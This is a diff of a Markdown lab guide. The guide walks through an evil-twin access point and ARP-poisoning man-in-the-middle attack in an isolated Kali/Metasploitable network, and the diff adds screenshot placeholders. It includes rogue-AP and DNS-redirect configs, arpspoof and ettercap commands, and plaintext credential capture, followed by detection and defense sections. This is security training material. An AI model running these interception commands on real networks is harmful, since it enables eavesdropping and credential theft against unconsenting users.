@@ -117,51 +117,57 @@ Start both VMs in VirtualBox and confirm connectivity:
 ```bash
 # On Kali — ping Metasploitable
 ping -c 3 192.168.56.102
-
-# Expected output:
-# PING 192.168.56.102: 56 data bytes
-# 64 bytes from 192.168.56.102: icmp_seq=0 ttl=64 time=0.5 ms
 ```
+
+> 📸 **Screenshot 1:** `screenshots/01-ping-connectivity.png`
+> *Take a screenshot showing successful ping replies from Metasploitable*
+
+![Ping Connectivity](screenshots/01-ping-connectivity.png)
+
+---
 
 ### Step 2: Confirm Metasploitable Services Are Running
 
 ```bash
 # From Kali — scan Metasploitable for open services
 nmap -sV 192.168.56.102
-
-# You should see services including:
-# 80/tcp   open  http     Apache httpd 2.2.8
-# 21/tcp   open  ftp      vsftpd 2.3.4
-# 22/tcp   open  ssh      OpenSSH 4.7p1
-# 23/tcp   open  telnet
 ```
+
+> 📸 **Screenshot 2:** `screenshots/02-nmap-scan.png`
+> *Take a screenshot of the full nmap output showing open ports and services*
+
+![Nmap Scan Results](screenshots/02-nmap-scan.png)
+
+---
 
 ### Step 3: Enable IP Forwarding on Kali
 
-This allows Kali to forward packets between the victim and gateway (essential for MITM):
-
 ```bash
-# Enable IP forwarding temporarily
 echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
-
-# Verify it's enabled
 cat /proc/sys/net/ipv4/ip_forward
-# Output should be: 1
 
 # Make it persistent across reboots
 echo "net.ipv4.ip_forward = 1" | sudo tee -a /etc/sysctl.conf
 sudo sysctl -p
 ```
 
+> 📸 **Screenshot 3:** `screenshots/03-ip-forwarding.png`
+> *Take a screenshot showing `cat /proc/sys/net/ipv4/ip_forward` outputting `1`*
+
+![IP Forwarding Enabled](screenshots/03-ip-forwarding.png)
+
+---
+
 ### Step 4: Identify Your Network Interfaces
 
 ```bash
 ip addr show
-
-# Look for:
-# eth0 or enp0s3  → NAT adapter (internet)
-# eth1 or enp0s8  → Host-only adapter (lab network) ← use this one
 ```
+
+> 📸 **Screenshot 4:** `screenshots/04-network-interfaces.png`
+> *Take a screenshot of `ip addr show` output highlighting your eth1/host-only interface*
+
+![Network Interfaces](screenshots/04-network-interfaces.png)
 
 ---
 
@@ -184,52 +190,34 @@ Legitimate AP         Rogue AP (Evil Twin)
 
 ### 1.2 Configure hostapd (Rogue AP)
 
-Create the hostapd configuration file:
-
 ```bash
 sudo nano /etc/hostapd/evil_twin.conf
 ```
 
-Paste the following configuration:
-
 ```ini
 # Rogue AP Configuration
-interface=eth1          # Your host-only interface
+interface=eth1
 driver=nl80211
-ssid=CorpWifi           # SSID to impersonate
+ssid=CorpWifi
 hw_mode=g
 channel=6
 macaddr_acl=0
 auth_algs=1
 ignore_broadcast_ssid=0
-
-# Uncomment below to add WPA2 (for WPA Evil Twin)
-# wpa=2
-# wpa_passphrase=password123
-# wpa_key_mgmt=WPA-PSK
-# rsn_pairwise=CCMP
 ```
 
 ### 1.3 Configure dnsmasq (DHCP + DNS for Victims)
-
-Create the dnsmasq configuration:
 
 ```bash
 sudo nano /etc/dnsmasq_evil.conf
 ```
 
 ```ini
-# DHCP server for victims connecting to rogue AP
 interface=eth1
 dhcp-range=192.168.56.110,192.168.56.150,12h
-
-# DNS — redirect all queries to attacker (for DNS spoofing)
 address=/#/192.168.56.101
-
-# DHCP options
-dhcp-option=3,192.168.56.1       # Default gateway
-dhcp-option=6,192.168.56.101     # DNS server (us)
-
+dhcp-option=3,192.168.56.1
+dhcp-option=6,192.168.56.101
 log-queries
 log-dhcp
 ```
@@ -242,24 +230,32 @@ sudo hostapd /etc/hostapd/evil_twin.conf
 
 # Terminal 2: Start DHCP/DNS service
 sudo dnsmasq -C /etc/dnsmasq_evil.conf --no-daemon
-
-# Terminal 3: Monitor who connects
-sudo tail -f /var/log/syslog | grep dnsmasq
 ```
 
-**Expected hostapd output:**
-```
-Configuration file: /etc/hostapd/evil_twin.conf
-Using interface eth1 with hwaddr xx:xx:xx:xx:xx:xx and ssid "CorpWifi"
-eth1: AP-ENABLED
-```
+> 📸 **Screenshot 5:** `screenshots/05-hostapd-running.png`
+> *Take a screenshot of the terminal showing `eth1: AP-ENABLED` from hostapd*
+
+![hostapd Evil Twin Running](screenshots/05-hostapd-running.png)
+
+---
+
+> 📸 **Screenshot 6:** `screenshots/06-dnsmasq-running.png`
+> *Take a screenshot of dnsmasq running and showing DHCP/DNS ready*
+
+![dnsmasq DHCP Running](screenshots/06-dnsmasq-running.png)
+
+---
 
 ### 1.5 Verify Rogue AP is Broadcasting
 
 ```bash
-# Scan for the SSID from another terminal
 sudo iwlist eth1 scan | grep -i "corpwifi"
 ```
+
+> 📸 **Screenshot 7:** `screenshots/07-rogue-ap-broadcast.png`
+> *Take a screenshot showing the CorpWifi SSID appearing in the scan results*
+
+![Rogue AP Broadcasting](screenshots/07-rogue-ap-broadcast.png)
 
 ---
 
@@ -284,81 +280,81 @@ ARP Spoofing:
 ### 2.2 Identify Target IPs
 
 ```bash
-# On Kali — identify machines on the network
-sudo netdiscover -i eth1 -r 192.168.56.0/24
-
-# Or use nmap
 sudo nmap -sn 192.168.56.0/24
-
-# Note down:
-# Victim IP:  192.168.56.102 (Metasploitable)
-# Gateway IP: 192.168.56.1   (vboxnet0)
 ```
 
-### 2.3 Execute ARP Poisoning with arpspoof
+> 📸 **Screenshot 8:** `screenshots/08-host-discovery.png`
+> *Take a screenshot of nmap host discovery showing both Kali and Metasploitable IPs*
 
-Open two terminals and run both commands simultaneously:
+![Host Discovery](screenshots/08-host-discovery.png)
+
+---
+
+### 2.3 Check ARP Cache BEFORE Poisoning
 
 ```bash
-# Terminal A: Tell the VICTIM that WE are the gateway
+# SSH into Metasploitable first
+ssh msfadmin@192.168.56.102
+
+# Check ARP table — note the gateway's real MAC
+arp -n
+```
+
+> 📸 **Screenshot 9:** `screenshots/09-arp-before-poison.png`
+> *Take a screenshot of the clean ARP table showing the real gateway MAC address*
+
+![ARP Cache Before Poisoning](screenshots/09-arp-before-poison.png)
+
+---
+
+### 2.4 Execute ARP Poisoning with arpspoof
+
+Open two terminals and run both simultaneously:
+
+```bash
+# Terminal A: Tell VICTIM that WE are the gateway
 sudo arpspoof -i eth1 -t 192.168.56.102 192.168.56.1
 
-# Terminal B: Tell the GATEWAY that WE are the victim
+# Terminal B: Tell GATEWAY that WE are the victim
 sudo arpspoof -i eth1 -t 192.168.56.1 192.168.56.102
 ```
 
-**What this does:**
-- Terminal A sends fake ARP replies to Metasploitable: *"The gateway (192.168.56.1) is at Kali's MAC"*
-- Terminal B sends fake ARP replies to the gateway: *"The victim (192.168.56.102) is at Kali's MAC"*
-- All traffic between them now flows through Kali
+> 📸 **Screenshot 10:** `screenshots/10-arpspoof-running.png`
+> *Take a screenshot of BOTH arpspoof terminals running side by side*
 
-### 2.4 Verify ARP Cache is Poisoned
+![ARP Spoofing Running](screenshots/10-arpspoof-running.png)
+
+---
+
+### 2.5 Verify ARP Cache is Poisoned
 
 ```bash
-# SSH into Metasploitable from another terminal
-ssh msfadmin@192.168.56.102
-# password: msfadmin
-
-# Check the ARP cache on Metasploitable
+# Back on Metasploitable
 arp -n
-
-# BEFORE poisoning:
-# 192.168.56.1    ether  aa:bb:cc:dd:ee:ff  (gateway's real MAC)
-
-# AFTER poisoning:
-# 192.168.56.1    ether  xx:xx:xx:xx:xx:xx  ← Kali's MAC! (poisoned)
+# Gateway IP should now show Kali's MAC — not the real gateway MAC
 ```
 
-### 2.5 Alternative: Use Ettercap for Full MITM
+> 📸 **Screenshot 11:** `screenshots/11-arp-after-poison.png`
+> *Take a screenshot of the poisoned ARP table — the gateway IP now maps to Kali's MAC*
 
-Ettercap automates ARP poisoning and traffic interception in one tool:
+![ARP Cache After Poisoning - Confirmed Poisoned](screenshots/11-arp-after-poison.png)
+
+---
+
+### 2.6 Alternative: Use Ettercap for Full MITM
 
 ```bash
-# Launch ettercap in text mode
 sudo ettercap -T -i eth1 -M arp:remote /192.168.56.102// /192.168.56.1//
-
-# Flags explained:
-# -T          → text interface
-# -i eth1     → use this interface
-# -M arp      → MITM via ARP poisoning
-# :remote     → also intercept routed traffic
-# /victim//   → target 1
-# /gateway//  → target 2
 ```
 
-Or use the GUI version:
+> 📸 **Screenshot 12:** `screenshots/12-ettercap-mitm.png`
+> *Take a screenshot of Ettercap running and confirming MITM is active*
 
-```bash
-sudo ettercap -G
-```
-
-Navigate to: `Hosts → Scan for Hosts → Hosts List → Add to Target 1/2 → MITM → ARP Poisoning`
+![Ettercap MITM Active](screenshots/12-ettercap-mitm.png)
 
 ---
 
 ## Part 3: Capturing & Analyzing Credentials
-
-With MITM established, now capture and analyze the intercepted traffic.
 
 ### 3.1 Start Wireshark
 
@@ -366,113 +362,96 @@ With MITM established, now capture and analyze the intercepted traffic.
 sudo wireshark &
 ```
 
-1. Select interface **eth1**
-2. Start capture
-3. Apply filter: `http` to see only HTTP traffic
+Select interface **eth1**, start capture, apply filter: `http`
+
+> 📸 **Screenshot 13:** `screenshots/13-wireshark-capturing.png`
+> *Take a screenshot of Wireshark capturing on eth1 with the http filter applied*
+
+![Wireshark Capturing HTTP Traffic](screenshots/13-wireshark-capturing.png)
+
+---
 
 ### 3.2 Generate Victim Traffic
 
-From Metasploitable (or simulate from Kali acting as victim):
-
 ```bash
-# On Metasploitable — browse to a web service
+# On Metasploitable
 curl http://192.168.56.102/dvwa/login.php \
   -d "username=admin&password=password&Login=Login"
-
-# Or use wget
-wget -qO- http://192.168.56.102/mutillidae/
 ```
 
 ### 3.3 Capture HTTP Credentials in Wireshark
 
-In Wireshark, filter for HTTP POST requests:
-
+Apply filter:
 ```
 http.request.method == "POST"
 ```
 
-Right-click a POST packet → **Follow → HTTP Stream**
+Right-click POST packet → **Follow → HTTP Stream**
 
-You will see plaintext credentials:
+> 📸 **Screenshot 14:** `screenshots/14-credentials-captured.png`
+> *Take a screenshot of the HTTP stream showing plaintext username and password*
 
-```
-POST /dvwa/login.php HTTP/1.1
-Host: 192.168.56.102
-Content-Type: application/x-www-form-urlencoded
+![Plaintext Credentials Intercepted](screenshots/14-credentials-captured.png)
 
-username=admin&password=password&Login=Login
-```
+---
 
-### 3.4 Use Driftnet to Capture Images in Transit
+### 3.4 Log Visited URLs with urlsnarf
 
 ```bash
-# Capture images passing through the MITM channel
-sudo driftnet -i eth1
-```
-
-A window opens showing all images being transmitted over HTTP in real time.
-
-### 3.5 Use urlsnarf to Log Visited URLs
-
-```bash
-# Log all URLs visited by the victim
 sudo urlsnarf -i eth1
 ```
 
-Output:
-```
-192.168.56.102 - - [31/May/2026:11:30:00] "GET http://192.168.56.102/dvwa/ HTTP/1.1"
-192.168.56.102 - - [31/May/2026:11:30:05] "POST http://192.168.56.102/dvwa/login.php HTTP/1.1"
-```
+> 📸 **Screenshot 15:** `screenshots/15-urlsnarf-output.png`
+> *Take a screenshot of urlsnarf logging the victim's HTTP requests in real time*
 
-### 3.6 Save Captured Traffic for Analysis
+![URL Sniffing with urlsnarf](screenshots/15-urlsnarf-output.png)
+
+---
+
+### 3.5 Capture Images with Driftnet
 
 ```bash
-# Save capture to file for later analysis
-sudo tcpdump -i eth1 -w /tmp/mitm_capture.pcap
-
-# Analyze later with:
-wireshark /tmp/mitm_capture.pcap
-# or
-tcpdump -r /tmp/mitm_capture.pcap -A | grep -i "password\|user\|login"
+sudo driftnet -i eth1
 ```
+
+> 📸 **Screenshot 16:** `screenshots/16-driftnet-images.png`
+> *Take a screenshot of the driftnet window showing images captured from victim traffic*
+
+![Images Captured via Driftnet](screenshots/16-driftnet-images.png)
 
 ---
 
 ## Detection & Defense
 
-Understanding how these attacks are detected is as important as executing them.
-
-### Detecting Evil Twin
-
-| Detection Method | How It Works |
-|---|---|
-| **WIDS (Wireless IDS)** | Tools like Kismet detect duplicate SSIDs with different BSSIDs |
-| **802.11w (Management Frame Protection)** | Cryptographically signs management frames, preventing rogue APs |
-| **SSID Pinning** | Enterprise clients remember trusted AP MAC addresses |
-| **Certificate-based auth (EAP-TLS)** | Client verifies server certificate — rogue AP can't fake it |
-
-```bash
-# Detect rogue APs with Kismet on Kali
-sudo kismet -c eth1
-# Look for: "SSID Spoofing" or duplicate SSIDs with different BSSIDs
-```
-
 ### Detecting ARP Spoofing
 
 ```bash
-# Method 1: Check for duplicate MACs in ARP table
+# Check for duplicate MACs in ARP table
 arp -n | awk '{print $3}' | sort | uniq -d
-# Duplicate MAC = ARP poisoning in progress
 
-# Method 2: Use arpwatch to monitor ARP changes
+# Monitor ARP changes with arpwatch
 sudo arpwatch -i eth1
-# Sends alerts when MAC-IP mappings change unexpectedly
-
-# Method 3: XArp (GUI ARP monitor)
-sudo apt install xarp
-sudo xarp
 ```
+
+> 📸 **Screenshot 17:** `screenshots/17-arp-detection.png`
+> *Take a screenshot showing the duplicate MAC detected in the ARP table*
+
+![ARP Spoofing Detected](screenshots/17-arp-detection.png)
+
+---
+
+### Detecting Evil Twin with Kismet
+
+```bash
+sudo kismet -c eth1
+```
+
+> 📸 **Screenshot 18:** `screenshots/18-kismet-detection.png`
+> *Take a screenshot of Kismet flagging the rogue AP / duplicate SSID*
+
+![Evil Twin Detected by Kismet](screenshots/18-kismet-detection.png)
+
+---
 
 ### Defensive Countermeasures
 
@@ -480,32 +459,16 @@ sudo xarp
 |---|---|
 | Evil Twin | Use WPA2-Enterprise with certificate validation |
 | ARP Spoofing | Enable Dynamic ARP Inspection (DAI) on managed switches |
-| Credential theft | Use HTTPS / TLS everywhere (HTTP credentials are visible) |
+| Credential theft | Use HTTPS / TLS everywhere |
 | DNS hijacking | Use DNSSEC, DNS over HTTPS (DoH) |
 | Traffic interception | End-to-end encryption (VPN, TLS 1.3) |
-
-```bash
-# Protect against ARP spoofing — add static ARP entry for gateway
-sudo arp -s 192.168.56.1 aa:bb:cc:dd:ee:ff
-
-# Use a VPN to encrypt all traffic even on compromised networks
-sudo openvpn --config your_vpn.ovpn
-```
 
 ---
 
 ## Cleanup
 
-Always clean up after a penetration test:
-
 ```bash
 # Stop arpspoof (Ctrl+C in both terminals)
-# Then restore ARP tables
-sudo arpspoof -i eth1 -t 192.168.56.102 192.168.56.1  # Ctrl+C to stop
-
-# Manually restore ARP on victim (if needed)
-# SSH into Metasploitable
-sudo arp -d 192.168.56.1   # Delete poisoned entry (it will refresh correctly)
 
 # Stop hostapd and dnsmasq
 sudo killall hostapd
@@ -518,6 +481,11 @@ echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
 sudo rm /etc/hostapd/evil_twin.conf
 sudo rm /etc/dnsmasq_evil.conf
 ```
+
+> 📸 **Screenshot 19:** `screenshots/19-cleanup-complete.png`
+> *Take a screenshot confirming IP forwarding is disabled and services are stopped*
+
+![Cleanup Complete](screenshots/19-cleanup-complete.png)
 
 ---
 
@@ -534,14 +502,19 @@ sudo rm /etc/dnsmasq_evil.conf
 
 ## Lab Results Summary
 
-| Test | Result | Evidence |
+| Step | Action | Screenshot |
 |---|---|---|
-| Evil Twin AP created | ✅ | hostapd broadcast confirmed |
-| DHCP assigned to victims | ✅ | dnsmasq leases log |
-| ARP cache poisoned | ✅ | Victim ARP table shows Kali MAC for gateway |
-| HTTP traffic intercepted | ✅ | Credentials visible in Wireshark |
-| URLs logged | ✅ | urlsnarf output captured |
-| Cleanup completed | ✅ | ARP restored, services stopped |
+| 1 | VM connectivity confirmed | 01-ping-connectivity.png |
+| 2 | Metasploitable services scanned | 02-nmap-scan.png |
+| 3 | IP forwarding enabled | 03-ip-forwarding.png |
+| 4 | Evil Twin AP started | 05-hostapd-running.png |
+| 5 | DHCP service running | 06-dnsmasq-running.png |
+| 6 | Rogue AP broadcasting | 07-rogue-ap-broadcast.png |
+| 7 | ARP cache poisoned | 11-arp-after-poison.png |
+| 8 | HTTP credentials intercepted | 14-credentials-captured.png |
+| 9 | URLs logged | 15-urlsnarf-output.png |
+| 10 | Attack detected | 17-arp-detection.png |
+| 11 | Cleanup completed | 19-cleanup-complete.png |
 
 ---
 
